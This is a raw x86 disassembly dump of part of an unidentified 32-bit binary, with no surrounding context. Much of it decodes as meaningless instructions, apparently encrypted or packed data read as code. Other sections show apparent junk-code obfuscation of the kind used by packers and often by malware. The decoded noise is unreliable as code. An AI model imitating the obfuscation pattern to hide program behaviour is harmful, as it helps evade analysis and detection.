  41edbd:	xlat   BYTE PTR ds:[ebx]
  41edbe:	loop   0x41ed88
  41edc0:	xchg   edi,eax
  41edc1:	loop   0x41ee18
  41edc3:	cmp    DWORD PTR [ebx-0x637f6337],esp
  41edc9:	xchg   BYTE PTR [ebp+0x708ccec3],bh
  41edcf:	mov    ecx,0x1c4274fa
  41edd4:	jp     0x41ee13
  41edd6:	outs   dx,BYTE PTR ds:[esi]
  41edd7:	push   0x36
  41edd9:	stos   BYTE PTR es:[edi],al
  41edda:	and    ch,BYTE PTR [esi-0x65d3fd50]
  41ede0:	cmp    DWORD PTR [ecx],ebx
  41ede2:	stos   DWORD PTR es:[edi],eax
  41ede3:	push   ss
  41ede4:	pop    ebx
  41ede5:	push   ds
  41ede6:	in     al,dx
  41ede7:	push   ebp
  41ede8:	add    eax,0xda6ec930
  41eded:	dec    eax
  41edee:	cmp    bl,BYTE PTR [edi+0xf995731]
  41edf4:	fnstcw WORD PTR [edi-0x21db859e]
  41edfa:	cmp    DWORD PTR [edx],ebp
  41edfc:	out    dx,al
  41edfd:	pop    es
  41edfe:	data16 (bad) 
  41ee00:	fiadd  WORD PTR [edx+0x4b256c6c]
  41ee06:	xchg   ecx,eax
  41ee07:	pop    ebp
  41ee08:	dec    ecx
  41ee09:	lods   al,BYTE PTR ds:[esi]
  41ee0a:	mov    cl,0xe6
  41ee0c:	ret    
  41ee0d:	fld    st(7)
  41ee0f:	pushf  
  41ee10:	push   ss
  41ee11:	into   
  41ee12:	mov    ecx,0x50f5a3d8
  41ee17:	ret    
  41ee18:	ret    0xcb63
  41ee1b:	mov    ebx,0x4f7efe8d
  41ee20:	sub    dl,BYTE PTR cs:[edx+0x21]
  41ee24:	add    edi,DWORD PTR [edx-0x30]
  41ee27:	rcl    BYTE PTR [edx],1
  41ee29:	in     al,dx
  41ee2a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ee2b:	mov    ebp,0x95f3eed3
  41ee30:	shld   DWORD PTR [edi+edx*8+0x47c9069a],ecx,cl
  41ee38:	inc    edi
  41ee39:	int    0x1f
  41ee3b:	leave  
  41ee3c:	imul   edi,DWORD PTR [eax-0x38],0x5
  41ee40:	jns    0x41ee3b
  41ee42:	ret    
  41ee43:	aas    
  41ee44:	out    dx,eax
  41ee45:	jle    0x41edef
  41ee47:	or     eax,0xe7e984bd
  41ee4c:	je     0x41ee4f
  41ee4e:	dec    esp
  41ee4f:	imul   ebx,edx,0xfffffffb
  41ee52:	jp     0x41ee6d
  41ee54:	cli    
  41ee55:	pop    eax
  41ee56:	mov    ecx,0x7747d25e
  41ee5b:	xchg   ebp,eax
  41ee5c:	add    ebp,DWORD PTR [ebx+0x79]
  41ee5f:	sub    eax,0x6766deaa
  41ee64:	dec    esp
  41ee65:	std    
  41ee66:	xchg   DWORD PTR [edx-0x8],edx
  41ee69:	dec    ecx
  41ee6a:	or     edi,DWORD PTR [ebx-0x1ffea7a7]
  41ee70:	push   edi
  41ee71:	cmc    
  41ee72:	in     eax,dx
  41ee73:	add    edx,DWORD PTR [esi-0x6ed862d5]
  41ee79:	cwde   
  41ee7a:	jbe    0x41ee3a
  41ee7c:	or     dl,BYTE PTR [edi+0x6b57ce34]
  41ee82:	int3   
  41ee83:	aas    
  41ee84:	push   eax
  41ee85:	xchg   ecx,eax
  41ee86:	push   0x21b71c89
  41ee8b:	jecxz  0x41ee4a
  41ee8d:	(bad)  
  41ee8e:	mov    al,0x41
  41ee90:	mov    DWORD PTR [eax],eax
  41ee92:	jns    0x41eea1
  41ee94:	dec    edx
  41ee95:	sub    edx,DWORD PTR [esi+ebx*8+0x74d2b398]
  41ee9c:	js     0x41eea2
  41ee9e:	mov    ebx,0xc05648c5
  41eea3:	lods   al,BYTE PTR ds:[esi]
  41eea4:	fcmovnbe st,st(0)
  41eea6:	sub    eax,0xd04330c
  41eeab:	enter  0xaa47,0x13
  41eeaf:	imul   eax,DWORD PTR [edi+0x471eac12],0x18
  41eeb6:	sub    esi,DWORD PTR [esi+0x599c3155]
  41eebc:	xlat   BYTE PTR cs:[ebx]
  41eebe:	mov    ds:0x46693d09,al
  41eec3:	arpl   WORD PTR [edx-0x29],bp
  41eec6:	aas    
  41eec7:	jne    0x41ee95
  41eec9:	fs push edx
  41eecb:	adc    BYTE PTR [edi+0x1350ff75],ah
  41eed1:	cmp    eax,0x11e2c5c5
  41eed6:	xor    al,0x63
  41eed8:	mov    ds:0x7f53b509,eax
  41eedd:	ja     0x41ee86
  41eedf:	lea    ebp,[eax]
  41eee1:	nop
  41eee2:	test   DWORD PTR [ecx+0x5780fd90],esi
  41eee8:	mov    al,ds:0xfb5d72b3
  41eeed:	dec    ecx
  41eeee:	imul   ebp,DWORD PTR [esi-0x20298011],0xad0b8d36
  41eef8:	cmp    cl,dl
  41eefa:	lods   al,BYTE PTR ds:[esi]
  41eefb:	jnp    0x41eef1
  41eefd:	adc    eax,0x1647577d
  41ef02:	out    dx,al
  41ef03:	or     dh,dl
  41ef05:	xor    esi,ebx
  41ef07:	loop   0x41ef40
  41ef09:	clc    
  41ef0a:	jne    0x41eeaa
  41ef0c:	lods   al,BYTE PTR ds:[esi]
  41ef0d:	nop
  41ef0e:	dec    eax
  41ef0f:	es pop es
  41ef11:	aaa    
  41ef12:	test   DWORD PTR [esi+0xdc8151e],esi
  41ef18:	fist   DWORD PTR [ecx]
  41ef1a:	jne    0x41ef94
  41ef1c:	leave  
  41ef1d:	dec    ecx
  41ef1e:	call   0x32faec99
  41ef23:	mov    edi,0xf6e440a2
  41ef28:	loope  0x41ef83
  41ef2a:	addr16 add eax,0x3e7417da
  41ef30:	and    DWORD PTR [edi-0x66],edx
  41ef33:	(bad)  
  41ef34:	(bad)  
  41ef35:	cmp    al,0xfc
  41ef37:	mov    ch,BYTE PTR [edi+0x1fc7fb65]
  41ef3d:	(bad)  [ebx-0x9]
  41ef40:	sub    bl,bh
  41ef42:	mov    WORD PTR [edx],ds
  41ef44:	lods   al,BYTE PTR ds:[esi]
  41ef45:	call   0xbdee:0x418d8747
  41ef4c:	std    
  41ef4d:	dec    edx
  41ef4e:	mov    eax,DWORD PTR [ebp-0x4c]
  41ef51:	adc    DWORD PTR ds:0x42812f,0x3493
  41ef5b:	add    eax,DWORD PTR [ebp-0xb4]
  41ef61:	xor    edx,0x29c
  41ef67:	xor    eax,0x2e02
  41ef6c:	sbb    ecx,ecx
  41ef6e:	xor    eax,0x7294
  41ef73:	movzx  edx,WORD PTR ds:0x428253
  41ef7a:	sbb    DWORD PTR ds:0x42812f,edx
  41ef80:	imul   eax,eax,0x68f3
  41ef86:	and    DWORD PTR ds:0x428147,edi
  41ef8c:	mov    ecx,DWORD PTR [ebp-0x8c]
  41ef92:	cmp    DWORD PTR ds:0x4282bb,0x0
  41ef99:	mov    edx,0x254
  41ef9e:	mov    edx,0x254c
  41efa3:	mov    edx,0x6b4f
  41efa8:	jmp    0x41f000
  41efad:	mov    DWORD PTR ds:0x4282ab,0x78fa
  41efb7:	cmp    DWORD PTR ds:0x4282bb,0x0
  41efbe:	jb     0x41efe4
  41efc4:	push   DWORD PTR [ebp-0x1c]
  41efc7:	push   0x74cd
  41efcc:	push   0x4a2f
  41efd1:	call   DWORD PTR ds:0x428ddc
  41efd7:	sub    edx,DWORD PTR ds:0x4281ef
  41efdd:	inc    edx
  41efde:	and    edx,DWORD PTR ds:0x42820b
  41efe4:	mov    DWORD PTR ds:0x428353,0x703b
  41efee:	and    edx,DWORD PTR ds:0x4281fb
  41eff4:	xor    edx,DWORD PTR ds:0x428267
  41effa:	and    DWORD PTR ds:0x428367,edx
  41f000:	and    eax,ecx
  41f002:	sub    eax,0x2818
  41f007:	mov    DWORD PTR [ebp-0xe8],eax
  41f00d:	jmp    0x41f369
  41f012:	adc    al,0x29
  41f015:	fstp   DWORD PTR [ebx]
  41f017:	and    BYTE PTR [edx+0x3a],ah
  41f01a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f01b:	repz mov ebx,0xbbf3bbb0
  41f021:	mov    al,0x99
  41f023:	sub    DWORD PTR [esi],edx
  41f025:	sbb    BYTE PTR [ebx-0x7e7e7ee],ah
  41f02b:	je     0x41efd5
  41f02d:	xor    DWORD PTR [esi],eax
  41f02f:	xchg   edi,eax
  41f030:	xor    eax,0xc6012644
  41f035:	arpl   WORD PTR [edx+0x20],bp
  41f038:	addr16 in eax,0xe8
  41f03b:	sub    cl,al
  41f03d:	jb     0x41f028
  41f03f:	lods   eax,DWORD PTR ds:[esi]
  41f040:	xor    DWORD PTR [edx+0x451852a9],0x57ad833d
  41f04a:	pop    ss
  41f04b:	adc    dl,BYTE PTR [edx]
  41f04d:	or     eax,0x6fae662d
  41f052:	fst    QWORD PTR ds:0xb8266563
  41f058:	add    DWORD PTR [ecx-0x22],edi
  41f05b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f05c:	out    0xc0,eax
  41f05e:	gs in  al,0xd7
  41f061:	xlat   BYTE PTR ds:[ebx]
  41f062:	sbb    ebx,0xed7c4ed5
  41f068:	mov    esi,0x19fe62e3
  41f06d:	fdiv   DWORD PTR [ebp+0x3c]
  41f070:	or     eax,DWORD PTR [esi-0xb]
  41f073:	adc    DWORD PTR [ebx-0x6c],ecx
  41f076:	cwde   
  41f077:	inc    ebp
  41f078:	mov    ch,0x4f
  41f07a:	pop    ecx
  41f07b:	push   esp
  41f07c:	sbb    bl,BYTE PTR [esi-0xc7243f]
  41f082:	jle    0x41f070
  41f084:	jmp    0x1ad11b26
  41f089:	mov    al,ds:0x6b421d09
  41f08e:	jge    0x41f0b4
  41f090:	and    cl,ch
  41f092:	(bad)  
  41f093:	mov    ds:0xdcfbeef2,eax
  41f098:	(bad)  
  41f099:	mov    gs:0x5685ceb0,eax
  41f09f:	push   edx
  41f0a0:	inc    esp
  41f0a1:	test   BYTE PTR [edi+0x36732bee],dl
  41f0a7:	js     0x41f04a
  41f0a9:	jmp    0x41f076
  41f0ab:	stos   DWORD PTR es:[edi],eax
  41f0ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f0ad:	pop    eax
  41f0ae:	pop    eax
  41f0af:	xor    edi,edx
  41f0b1:	sbb    al,0xf9
  41f0b3:	and    DWORD PTR [edx+0x47],ebp
  41f0b6:	test   BYTE PTR [ebx+ebp*4+0x312eb28f],al
  41f0bd:	mov    dh,0xa5
  41f0bf:	dec    edx
  41f0c0:	add    ah,ah
  41f0c2:	xor    ecx,DWORD PTR [eax-0x7f]
  41f0c5:	neg    BYTE PTR [edx-0x31]
  41f0c8:	inc    edx
  41f0c9:	mov    dl,0xe7
  41f0cb:	xchg   ecx,ecx
  41f0cd:	sub    DWORD PTR [ecx],ebp
  41f0cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f0d0:	xchg   ebp,eax
  41f0d1:	jo     0x41f05c
  41f0d3:	pop    esi
  41f0d4:	push   edx
  41f0d5:	fnsave [edx-0x4538288c]
  41f0db:	mov    eax,ds:0x17c9c7ba
  41f0e0:	sub    esi,esi
  41f0e2:	pop    eax
  41f0e3:	pop    ds
  41f0e4:	jecxz  0x41f0ba
  41f0e6:	mov    ah,0x44
  41f0e8:	push   cs
  41f0e9:	(bad)  [eax-0x2a]
  41f0ec:	repz int3 
  41f0ee:	xchg   esi,eax
  41f0ef:	inc    esp
  41f0f0:	sub    al,0x7d
  41f0f2:	mov    dl,0xca
  41f0f4:	enter  0x58c,0xf4
  41f0f8:	adc    DWORD PTR [edi+0x74],0xffffffb2
  41f0fc:	sub    BYTE PTR [edx-0x2ece21c5],bh
  41f102:	test   eax,0x4d50c553
  41f107:	inc    eax
  41f108:	mov    cl,0x4c
  41f10a:	push   ecx
  41f10b:	inc    ecx
  41f10c:	push   0x1a
  41f10e:	adc    DWORD PTR [ecx+0x43c2fd05],edi
  41f114:	push   0x23
  41f116:	cwde   
  41f117:	into   
  41f118:	imul   ecx,esp,0xeba56592
  41f11e:	retf   
  41f11f:	lahf   
  41f120:	pop    edx
  41f121:	mov    eax,0xdb23cd7d
  41f126:	xor    DWORD PTR [esi],edx
  41f128:	pop    ds
  41f129:	(bad)  
  41f12a:	push   esp
  41f12b:	ins    DWORD PTR es:[edi],dx
  41f12c:	js     0x41f11c
  41f12e:	ja     0x41f1ad
  41f130:	imul   edi,DWORD PTR [ebx+0x5359143e],0xcbd51668
  41f13a:	pushf  
  41f13b:	rcr    DWORD PTR ds:0x3d9808fb,1
  41f141:	leave  
  41f142:	and    ebp,edi
  41f144:	fs jae 0x41f198
  41f147:	and    DWORD PTR [eax-0xd],ecx
  41f14a:	cmp    ecx,ebp
  41f14c:	lods   al,BYTE PTR ds:[esi]
  41f14d:	jmp    0x41f158
  41f14f:	lahf   
  41f150:	pop    esi
  41f151:	loop   0x41f14a
  41f153:	and    al,0x1d
  41f155:	aas    
  41f156:	outs   dx,WORD PTR ds:[esi]
  41f158:	and    eax,0x1b0ecc26
  41f15d:	sub    cl,0xa3
  41f160:	je     0x41f102
  41f162:	pop    ebp
  41f163:	jo     0x41f163
  41f165:	ror    DWORD PTR [ebp-0x54],0xe6
  41f169:	push   ebx
  41f16a:	jg     0x41f1e2
  41f16c:	test   eax,0x4068237c
  41f171:	dec    eax
  41f172:	inc    eax
  41f173:	or     bh,cl
  41f175:	fistp  DWORD PTR [ebx]
  41f177:	dec    esi
  41f178:	add    al,0xcf
  41f17a:	fisttp QWORD PTR [edx]
  41f17c:	sub    bl,BYTE PTR [ecx+0x493bb9ae]
  41f182:	call   DWORD PTR [ebx-0x49c23344]
  41f188:	in     eax,dx
  41f189:	xor    al,0x0
  41f18b:	or     bh,dh
  41f18d:	ins    DWORD PTR es:[edi],dx
  41f18e:	jg     0x41f1ab
  41f190:	sub    dh,BYTE PTR ds:0xf1ed6737
  41f196:	data16 jb 0x41f1b6
  41f199:	cmp    DWORD PTR [edx+0x3e],esi
  41f19c:	retf   0xe271
  41f19f:	out    0x30,al
  41f1a1:	shl    eax,1
  41f1a3:	mov    ebp,0x8b763fe2
  41f1a8:	mov    ebp,0xdce95792
  41f1ad:	and    DWORD PTR [eax],esi
  41f1af:	adc    BYTE PTR [ebx],al
  41f1b1:	icebp  
  41f1b2:	repnz push ecx
  41f1b4:	xchg   esp,eax
  41f1b5:	xchg   ebx,eax
  41f1b6:	popa   
  41f1b7:	test   al,0x23
  41f1b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f1ba:	stos   BYTE PTR es:[edi],al
  41f1bb:	aaa    
  41f1bc:	push   esi
  41f1bd:	aaa    
  41f1be:	adc    esp,DWORD PTR [edx]
  41f1c0:	repz or al,0x82
  41f1c3:	sub    al,0x83
  41f1c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1c6:	ins    BYTE PTR es:[edi],dx
  41f1c7:	and    edx,DWORD PTR [eax+0x5e]
  41f1ca:	xchg   ebx,eax
  41f1cb:	inc    ebx
  41f1cc:	hlt    
  41f1cd:	fist   DWORD PTR [esi-0xd]
  41f1d0:	add    al,0x21
  41f1d2:	fs pop edi
  41f1d4:	adc    al,0x28
  41f1d6:	mov    dl,0x31
  41f1d8:	or     al,0xb2
  41f1da:	lahf   
  41f1db:	cli    
  41f1dc:	(bad)
  41f1df:	into   
  41f1e0:	xlat   BYTE PTR ds:[ebx]
  41f1e1:	pop    ecx
  41f1e2:	std    
  41f1e3:	dec    eax
  41f1e4:	jns    0x41f238
  41f1e6:	shr    DWORD PTR [eax],1
  41f1e8:	xor    eax,0x51f54d6d
  41f1ed:	jmp    0xa804:0xb02d9c68
  41f1f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1f5:	cmp    bh,ch
  41f1f7:	mov    al,BYTE PTR [esi+eax*4-0x5f138c17]
  41f1fe:	adc    al,BYTE PTR [eax-0x70c57ec4]
  41f204:	and    DWORD PTR [edi+ecx*8+0x173eee65],esp
  41f20b:	leave  
  41f20c:	mov    ch,0x7d
  41f20e:	cmp    al,0x34
  41f210:	dec    eax
  41f211:	nop
  41f212:	nop
  41f213:	jmp    FWORD PTR [ebp-0x24213847]
  41f219:	repz jmp 0x834d:0x5cf63220
  41f221:	mov    ecx,0xee95caa6
  41f226:	dec    ecx
  41f227:	loop   0x41f268
  41f229:	popa   
  41f22a:	jbe    0x41f2a2
  41f22c:	add    eax,0x8518cbb7
  41f231:	xchg   esp,eax
  41f232:	push   ds
  41f233:	jmp    0x47a7dd27
  41f238:	out    0xc4,al
  41f23a:	dec    edi
  41f23b:	or     al,0x6c
  41f23d:	cmp    eax,0x3553ebdd
  41f242:	or     esp,eax
  41f244:	and    eax,0xb413fcb8
  41f249:	xchg   bl,ah
  41f24b:	sbb    esi,ebp
  41f24d:	add    BYTE PTR [ebp+eax*4-0x6a8b3d3c],0xb9
  41f255:	jb     0x41f23a
  41f257:	jmp    0x7d3f6194
  41f25c:	xchg   BYTE PTR [ecx],dh
  41f25e:	xchg   ecx,eax
  41f25f:	mov    al,BYTE PTR [ebx+0x70a46ae7]
  41f265:	(bad)  
  41f266:	mov    esi,0xbf3a05be
  41f26b:	(bad)  
  41f26c:	out    0xfa,eax
  41f26e:	jmp    0x439b:0x9eb38735
  41f275:	mov    al,ds:0x443e05fd
  41f27a:	mov    esi,0x3842ee5f
  41f27f:	sbb    BYTE PTR [edi-0x53],bl
  41f282:	pusha  
  41f283:	push   esi
  41f284:	jno    0x41f2fa
  41f286:	xchg   edi,eax
  41f287:	or     edx,0x7e8fc6ff
  41f28d:	popf   
  41f28e:	dec    esp
  41f28f:	into   
  41f290:	mov    edi,0x4a29521f
  41f295:	pop    ss
  41f296:	fcmovnbe st,st(2)
  41f298:	add    esp,DWORD PTR [ecx-0x4c9f58a5]
  41f29e:	inc    esi
  41f29f:	xor    eax,0x8efe3f15
  41f2a4:	rcl    BYTE PTR [edi+0x7606876],cl
  41f2aa:	jns    0x41f272
  41f2ac:	inc    edi
  41f2ad:	sbb    ch,cl
  41f2af:	test   esp,0x730931c3
  41f2b5:	fdivr  DWORD PTR [ebx]
  41f2b7:	test   BYTE PTR [eax+0x33],cl
  41f2ba:	sbb    eax,0x94732d1f
  41f2bf:	push   cs
  41f2c0:	or     edx,DWORD PTR [ebx]
  41f2c2:	dec    edi
  41f2c3:	fsub   st(5),st
  41f2c5:	in     eax,0x6f
  41f2c7:	sbb    al,0x14
  41f2c9:	inc    esi
  41f2ca:	fiadd  WORD PTR [edi+ebx*2+0x36b0732]
  41f2d1:	sub    eax,0x30da692a
  41f2d6:	inc    edx
  41f2d7:	xchg   ecx,eax
  41f2d8:	in     eax,0x47
  41f2da:	inc    eax
  41f2db:	mov    dl,cl
  41f2dd:	push   edi
  41f2de:	in     eax,0xc7
  41f2e0:	(bad)  
  41f2e1:	push   0x52
  41f2e3:	addr16 jge 0x41f2d8
  41f2e6:	repnz cmp ebx,DWORD PTR ds:0x5e77a652
  41f2ed:	mov    al,ds:0x1bff0e78
  41f2f2:	fdiv   st(5),st
  41f2f4:	mov    ds:0xa1d6bc95,eax
  41f2f9:	or     al,0x5e
  41f2fb:	mov    edi,0xf3c80e97
  41f300:	or     BYTE PTR [edx+0x5ff7320c],dh
  41f306:	nop
  41f307:	scas   eax,DWORD PTR es:[edi]
  41f308:	lea    ebp,[ebx-0x26dd4a1]
  41f30e:	hlt    
  41f30f:	push   eax
  41f310:	push   es
  41f311:	lds    eax,FWORD PTR [esp+edi*2]
  41f314:	ficomp WORD PTR [eax+eiz*8-0x35]
  41f318:	mov    ebx,0xcd1f11e8
  41f31d:	push   ds
  41f31e:	add    esp,DWORD PTR [esi]
  41f320:	and    ebx,0x7b
  41f323:	loop   0x41f30d
  41f325:	mov    ebp,0x9ab39562
  41f32a:	cdq    
  41f32b:	shr    DWORD PTR [ecx],cl
  41f32d:	mov    eax,ds:0x546961f6
  41f332:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f333:	jmp    DWORD PTR [esi-0x3e701db5]
  41f339:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f33a:	pop    ds
  41f33b:	fmul   QWORD PTR [ebx+ebp*2+0x5224d0ee]
  41f342:	rcl    BYTE PTR [eax],0x8d
  41f345:	mov    ah,0xd7
  41f347:	add    dl,BYTE PTR [edi]
  41f349:	ss pop ss
  41f34b:	js     0x41f34c
  41f34d:	mov    ah,0x3
  41f34f:	add    BYTE PTR ds:0xc31f7e7e,dh
  41f355:	sbb    dh,BYTE PTR ds:0x6c671dd4
  41f35b:	or     eax,0xf0f20327
  41f360:	loopne 0x41f38e
  41f362:	and    eax,0x975178d4
  41f367:	pop    ss
  41f368:	jbe    0x41f331
  41f36a:	inc    ebp
  41f36b:	nop
  41f36c:	mov    DWORD PTR [edi+0x0],ebp
  41f36f:	add    BYTE PTR [ebx+0x4282d33d],al
  41f375:	add    BYTE PTR [eax],al
  41f377:	movzx  edx,WORD PTR ds:0x4281ef
  41f37e:	mov    ecx,DWORD PTR ds:0x428237
  41f384:	mov    ecx,DWORD PTR ds:0x428223
  41f38a:	jmp    0x41f3f3
  41f38f:	not    eax
  41f391:	mov    DWORD PTR ds:0x42820f,ebx
  41f397:	cmp    DWORD PTR ds:0x4282d3,0x0
  41f39e:	jbe    0x41f3dd
  41f3a4:	push   DWORD PTR [ebp-0x14]
  41f3a7:	push   DWORD PTR [ebp-0x28]
  41f3aa:	push   DWORD PTR [ebp-0x10]
  41f3ad:	push   0x4280e3
  41f3b2:	push   0x1cee
  41f3b7:	push   0x479c
  41f3bc:	push   0x8744
  41f3c1:	call   DWORD PTR ds:0x428de0
  41f3c7:	sub    ecx,DWORD PTR ds:0x428207
  41f3cd:	mov    DWORD PTR ds:0x428157,0x2f55
  41f3d7:	and    DWORD PTR ds:0x4282b3,ebx
  41f3dd:	or     DWORD PTR ds:0x4282cb,ecx
  41f3e3:	xor    edx,edx
  41f3e5:	or     edx,DWORD PTR ds:0x42815f
  41f3eb:	mov    edx,DWORD PTR [edx]
  41f3ed:	sbb    DWORD PTR ds:0x4282e7,edx
  41f3f3:	mov    DWORD PTR [ebp-0xd0],0x5a58
  41f3fd:	mov    DWORD PTR [ebp-0x120],0x3c77
  41f407:	mov    DWORD PTR [ebp-0x2c],0x2129
  41f40e:	or     DWORD PTR ds:0x42813f,0x8a7
  41f418:	mov    eax,DWORD PTR [ebp-0x2c]
  41f41b:	imul   eax,eax,0x1ada
  41f421:	cmp    DWORD PTR ds:0x42834b,0x0
  41f428:	mov    DWORD PTR ds:0x4282df,0xae0
  41f432:	mov    DWORD PTR ds:0x42811b,ebx
  41f438:	mov    ecx,DWORD PTR ds:0x42833b
  41f43e:	jmp    0x41f484
  41f443:	mov    DWORD PTR ds:0x4282c3,ebx
  41f449:	mov    DWORD PTR ds:0x42813f,0x2430
  41f453:	cmp    DWORD PTR ds:0x42834b,0x0
  41f45a:	ja     0x41f47c
  41f460:	push   DWORD PTR [ebp-0x18]
  41f463:	push   0x427ef5
  41f468:	call   DWORD PTR ds:0x428e64
  41f46e:	sub    ecx,0x6218
  41f474:	inc    DWORD PTR ds:0x428357
  41f47a:	add    edx,edx
  41f47c:	or     edx,ecx
  41f47e:	sub    edx,0x9ad
  41f484:	mov    ecx,DWORD PTR [ebp-0x120]
  41f48a:	cmp    DWORD PTR ds:0x428157,0x0
  41f491:	not    edx
  41f493:	mov    DWORD PTR ds:0x4282af,0x6486
  41f49d:	mov    DWORD PTR ds:0x42821b,0x7a92
  41f4a7:	mov    DWORD PTR ds:0x42824b,ebx
  41f4ad:	jmp    0x41f510
  41f4b2:	mov    DWORD PTR ds:0x428353,0x24a4
  41f4bc:	cmp    DWORD PTR ds:0x428157,0x0
  41f4c3:	ja     0x41f4ed
  41f4c9:	push   0x427fbb
  41f4ce:	push   DWORD PTR [ebp-0x10]
  41f4d1:	call   DWORD PTR ds:0x428de4
  41f4d7:	neg    DWORD PTR ds:0x42814b
  41f4dd:	and    DWORD PTR ds:0x42822f,0x4282b3
  41f4e7:	and    DWORD PTR ds:0x42832f,edi
  41f4ed:	movzx  edx,BYTE PTR ds:0x428147
  41f4f4:	sbb    edx,DWORD PTR ds:0x4282cf
  41f4fa:	mov    DWORD PTR ds:0x428147,edx
  41f500:	sub    DWORD PTR ds:0x428243,0x2ffe
  41f50a:	and    edx,0x4c8b
  41f510:	imul   ecx,ecx,0x53ae
  41f516:	and    DWORD PTR ds:0x42814f,ebx
  41f51c:	imul   ecx,ecx,0x7447
  41f522:	mov    edx,DWORD PTR [ebp-0xd0]
  41f528:	sbb    DWORD PTR ds:0x428353,0x1933
  41f532:	and    ecx,edx
  41f534:	cmp    DWORD PTR ds:0x428133,0x0
  41f53b:	mov    DWORD PTR ds:0x42834f,0x38cb
  41f545:	mov    edx,0x66af
  41f54a:	not    edx
  41f54c:	jmp    0x41f5db
  41f551:	mov    DWORD PTR ds:0x42820f,0x6044
  41f55b:	not    DWORD PTR ds:0x42821b
  41f561:	cmp    DWORD PTR ds:0x428133,0x0
  41f568:	jg     0x41f5a9
  41f56e:	push   0x13fa
  41f573:	push   DWORD PTR [ebp-0x18]
  41f576:	push   0x47c2
  41f57b:	push   DWORD PTR [ebp-0x1c]
  41f57e:	push   0x5b80
  41f583:	push   DWORD PTR [ebp-0x10]
  41f586:	push   0x6360
  41f58b:	push   0x2aad
  41f590:	push   DWORD PTR [ebp-0x28]
  41f593:	push   DWORD PTR [ebp-0x10]
  41f596:	call   DWORD PTR ds:0x428de8
  41f59c:	inc    edx
  41f59d:	adc    DWORD PTR ds:0x428113,edi
  41f5a3:	and    DWORD PTR ds:0x4282ab,ecx
  41f5a9:	movzx  edx,WORD PTR ds:0x4282c3
  41f5b0:	add    edx,DWORD PTR ds:0x4282bb
  41f5b6:	mov    DWORD PTR ds:0x4282c3,edx
  41f5bc:	add    DWORD PTR ds:0x4282b7,0x7749
  41f5c6:	adc    DWORD PTR ds:0x42821b,0x1ba
  41f5d0:	dec    edx
  41f5d1:	sub    DWORD PTR ds:0x42834f,0x6520
  41f5db:	or     ecx,0x2a20
  41f5e1:	mov    DWORD PTR ds:0x42815b,0x1cbf
  41f5eb:	mov    edx,DWORD PTR [ebp-0x70]
  41f5ee:	adc    DWORD PTR ds:0x4282df,0x2406
  41f5f8:	xor    ecx,edx
  41f5fa:	or     DWORD PTR ds:0x4282cf,ecx
  41f600:	mov    edx,DWORD PTR [ebp+0x14]
  41f603:	adc    DWORD PTR ds:0x428353,0x652b
  41f60d:	mov    eax,DWORD PTR [edx+eax*1-0x37a66ea]
  41f614:	xor    DWORD PTR ds:0x428217,0x49e9
  41f61e:	lea    eax,[ecx+eax*1-0x45a1]
  41f625:	cmp    DWORD PTR ds:0x42822b,0x0
  41f62c:	mov    ecx,0x2e1f
  41f631:	mov    DWORD PTR ds:0x428247,ecx
  41f637:	mov    ecx,0x173d
  41f63c:	not    DWORD PTR ds:0x428213
  41f642:	jmp    0x41f698
  41f647:	mov    DWORD PTR ds:0x42825f,0x35b0
  41f651:	cmp    DWORD PTR ds:0x42822b,0x0
  41f658:	jae    0x41f680
  41f65e:	push   0x2832
  41f663:	call   DWORD PTR ds:0x428dec
  41f669:	dec    ecx
  41f66a:	or     DWORD PTR ds:0x4281eb,0x127d
  41f674:	mov    ecx,DWORD PTR ds:0x4282b7
  41f67a:	add    DWORD PTR ds:0x4282db,ecx
  41f680:	sbb    DWORD PTR ds:0x42824f,ebx
  41f686:	mov    ecx,DWORD PTR ds:0x428123
  41f68c:	adc    DWORD PTR ds:0x428117,ecx
  41f692:	and    ecx,0x3d62
  41f698:	mov    DWORD PTR [ebp-0xb0],eax
  41f69e:	mov    ecx,DWORD PTR ds:0x42837f
  41f6a4:	mov    ecx,DWORD PTR [ecx]
  41f6a6:	xor    DWORD PTR ds:0x42820f,ecx
  41f6ac:	mov    DWORD PTR [ebp-0x11c],0x303f
  41f6b6:	not    eax
  41f6b8:	mov    DWORD PTR [ebp-0x98],0x51a9
  41f6c2:	sub    DWORD PTR ds:0x4282e3,0x1cf2
  41f6cc:	mov    DWORD PTR [ebp-0xcc],0x6d4d
  41f6d6:	xor    eax,ecx
  41f6d8:	mov    eax,DWORD PTR [ebp-0xcc]
  41f6de:	cmp    DWORD PTR ds:0x4282c7,0x0
  41f6e5:	mov    DWORD PTR ds:0x4282cf,0x6375
  41f6ef:	not    DWORD PTR ds:0x42812f
  41f6f5:	mov    DWORD PTR ds:0x4281eb,ecx
  41f6fb:	jmp    0x41f76f
  41f700:	mov    DWORD PTR ds:0x4281fb,0x2351
  41f70a:	mov    DWORD PTR ds:0x42823f,ebx
  41f710:	cmp    DWORD PTR ds:0x4282c7,0x0
  41f717:	jb     0x41f758
  41f71d:	push   0x3851
  41f722:	push   0x42822b
  41f727:	call   DWORD PTR ds:0x428df0
  41f72d:	movzx  ecx,WORD PTR ds:0x4281fb
  41f734:	xor    DWORD PTR ds:0x428367,ecx
  41f73a:	mov    ecx,DWORD PTR ds:0x42822b
  41f740:	add    ecx,DWORD PTR ds:0x428223
  41f746:	mov    DWORD PTR ds:0x42822b,ecx
  41f74c:	mov    ecx,DWORD PTR ds:0x42823b
  41f752:	adc    DWORD PTR ds:0x42834b,ecx
  41f758:	inc    ecx
  41f759:	xor    DWORD PTR ds:0x4282e7,ebx
  41f75f:	sub    DWORD PTR ds:0x428147,edx
  41f765:	and    DWORD PTR ds:0x4282c7,0x3308
  41f76f:	xor    eax,0x6f65
  41f774:	add    DWORD PTR ds:0x4282db,edx
  41f77a:	mov    ecx,DWORD PTR [ebp-0x98]
  41f780:	add    DWORD PTR ds:0x428347,0x4282bb
  41f78a:	or     eax,ecx
  41f78c:	and    DWORD PTR ds:0x4281f7,0x3807
